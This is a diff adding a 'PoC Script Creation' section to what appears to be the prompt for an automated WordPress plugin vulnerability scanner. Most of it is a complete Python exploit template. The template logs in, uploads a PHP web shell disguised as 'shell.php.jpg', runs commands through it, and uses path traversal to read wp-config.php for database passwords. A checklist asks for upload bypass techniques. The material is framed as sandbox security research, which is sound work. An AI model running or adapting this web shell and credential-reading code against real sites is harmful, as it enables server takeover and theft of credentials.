@@ -365,6 +365,167 @@ Path Traversal + File Write: 9.8 Critical
 
 ---
 
+## PoC Script Creation (REQUIRED)
+
+**When you find a vulnerability, you MUST create a standalone PoC script.**
+
+### File Location
+Save PoC to: `reports/{plugin_slug}/poc_file_rce_{short_id}.py`
+
+Example: `reports/gallery-pro/poc_file_rce_abc123.py`
+
+### PoC Template for File/RCE Vulnerabilities
+
+```python
+#!/usr/bin/env python3
+"""
+PoC for {Vulnerability Title}
+Plugin: {plugin_slug} v{version}
+Vulnerability: {vuln_type} (arbitrary_file_upload/read/delete/path_traversal)
+Auth Required: {auth_level}
+
+Usage:
+    python3 poc_file_rce.py --url http://target.com
+    python3 poc_file_rce.py --url http://target.com -u subscriber -p subscriber
+"""
+
+import argparse
+import requests
+import sys
+import re
+
+def login(session, base_url, username, password):
+    """Authenticate to WordPress."""
+    login_url = f"{base_url}/wp-login.php"
+    data = {
+        "log": username,
+        "pwd": password,
+        "wp-submit": "Log In",
+        "redirect_to": f"{base_url}/wp-admin/",
+        "testcookie": "1"
+    }
+    resp = session.post(login_url, data=data, allow_redirects=True)
+    return "dashboard" in resp.text.lower() or resp.status_code == 200
+
+def get_nonce(session, base_url, nonce_action):
+    """Fetch WordPress nonce for AJAX action."""
+    # Adjust URL based on where nonce is exposed
+    resp = session.get(f"{base_url}/wp-admin/admin-ajax.php?action=get_nonce")
+    # Parse nonce from response - adjust regex as needed
+    match = re.search(r'"nonce":"([a-f0-9]+)"', resp.text)
+    return match.group(1) if match else None
+
+def exploit(base_url, session=None):
+    """
+    Execute the file upload/RCE exploit.
+
+    Returns:
+        tuple: (vulnerable: bool, details: str)
+    """
+    s = session or requests.Session()
+
+    # === FILE UPLOAD EXPLOIT ===
+    # Adjust these for the specific vulnerability
+    target_url = f"{base_url}/wp-admin/admin-ajax.php"
+
+    # PHP shell payload
+    shell_content = b'<?php echo "VULNERABLE_" . "MARKER"; system($_GET["cmd"]); ?>'
+
+    # Try various bypass techniques
+    files = {
+        'file': ('shell.php.jpg', shell_content, 'image/jpeg'),  # Double extension
+    }
+    data = {
+        'action': 'vulnerable_upload_action',
+        # Add nonce if required
+    }
+
+    resp = s.post(target_url, files=files, data=data)
+
+    # Check if upload succeeded
+    if 'success' in resp.text.lower() or resp.status_code == 200:
+        # Try to access the uploaded shell
+        shell_paths = [
+            f"{base_url}/wp-content/uploads/shell.php.jpg",
+            f"{base_url}/wp-content/uploads/2024/01/shell.php.jpg",  # Date-based
+        ]
+
+        for shell_path in shell_paths:
+            check = s.get(f"{shell_path}?cmd=id")
+            if "VULNERABLE_MARKER" in check.text or "uid=" in check.text:
+                return True, f"Shell uploaded and executing at: {shell_path}"
+
+    # === PATH TRAVERSAL FILE READ ===
+    data = {
+        'action': 'vulnerable_read_action',
+        'file': '../../../wp-config.php'
+    }
+    resp = s.post(target_url, data=data)
+    if "DB_PASSWORD" in resp.text or "DB_NAME" in resp.text:
+        return True, f"Path traversal successful - wp-config.php leaked"
+
+    return False, resp.text[:500]
+
+def main():
+    parser = argparse.ArgumentParser(description="PoC for File Upload/RCE vulnerability")
+    parser.add_argument("--url", "-t", required=True, help="Target WordPress URL")
+    parser.add_argument("--username", "-u", help="WordPress username (if auth required)")
+    parser.add_argument("--password", "-p", help="WordPress password (if auth required)")
+    args = parser.parse_args()
+
+    base_url = args.url.rstrip("/")
+    session = requests.Session()
+
+    # Login if credentials provided
+    if args.username and args.password:
+        print(f"[*] Logging in as {args.username}...")
+        if not login(session, base_url, args.username, args.password):
+            print("[-] Login failed!")
+            sys.exit(1)
+        print("[+] Login successful!")
+
+    # Execute exploit
+    print(f"[*] Testing {base_url} for file upload/RCE vulnerability...")
+    vulnerable, details = exploit(base_url, session)
+
+    if vulnerable:
+        print("[+] VULNERABLE!")
+        print(f"[+] Details: {details}")
+    else:
+        print("[-] Not vulnerable or exploit failed")
+        print(f"[-] Response: {details}")
+
+    return 0 if vulnerable else 1
+
+if __name__ == "__main__":
+    sys.exit(main())
+```
+
+### Required Structure
+Every PoC MUST have:
+1. **Argparse CLI** with `--url`, `-u/--username`, `-p/--password`
+2. **Login function** for authenticated vulnerabilities
+3. **Nonce fetching** if the endpoint requires it
+4. **Clear output** showing VULNERABLE or NOT VULNERABLE
+5. **Docstring** with plugin name, version, vuln type, auth level
+
+### PoC Checklist
+- [ ] Script runs with `python3 poc.py --help`
+- [ ] Script works against sandbox: `python3 poc.py --url http://172.17.0.1:8000`
+- [ ] For auth vulns: `python3 poc.py --url http://172.17.0.1:8000 -u subscriber -p subscriber`
+- [ ] Output clearly shows success/failure
+- [ ] No hardcoded URLs or credentials
+- [ ] Handles errors gracefully
+- [ ] For file upload: Attempts multiple bypass techniques
+- [ ] For path traversal: Tests encoded variants
+
+### After Creating PoC
+1. Test it against the sandbox
+2. Create finding with `wpguard_finding_create()`
+3. Include PoC path in finding's `poc_path` field
+
+---
+
 ## Signal Completion
 
 ```python
